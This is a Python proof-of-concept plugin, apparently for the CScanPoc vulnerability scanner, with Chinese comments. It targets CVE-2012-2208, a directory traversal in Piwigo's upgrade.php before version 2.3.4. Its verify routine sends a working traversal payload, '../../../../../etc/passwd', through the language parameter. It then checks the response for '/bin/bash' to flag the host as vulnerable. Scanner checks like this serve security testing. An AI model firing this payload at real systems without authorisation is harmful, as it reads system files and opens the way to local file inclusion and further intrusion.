# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Piwigo_0002'  # 平台漏洞编号，留空
    name = 'Piwigo 目录穿越漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2012-04-23'  # 漏洞公布时间
    desc = '''
        Piwigo是一个基于MySQL5与PHP5开发的相册系统.提供基本的发布和管理照片功能,按多种方式浏览如类别,标签,时间等。
        Piwigo是用PHP编写的相册脚本。
        Piwigo 2.3.4之前版本的upgrade.php中存在目录遍历漏洞，通过language参数中的“..”可允许远程攻击者包含和执行任意本地文件。  
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2012-7650'  # 漏洞来源
    cnvd_id = 'CNVD-2012-7650'  # cnvd漏洞编号
    cve_id = 'CVE-2012-2208'  # cve编号
    product = 'Piwigo'  # 漏洞应用名称
    product_version = '2.3.4之前版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6299f2c0-acbc-4a81-a927-87576833050b'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/upgrade.php?language=../../../../../etc/passwd'
            url = self.target + payload
            r = requests.get(url)

            if "/bin/bash" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
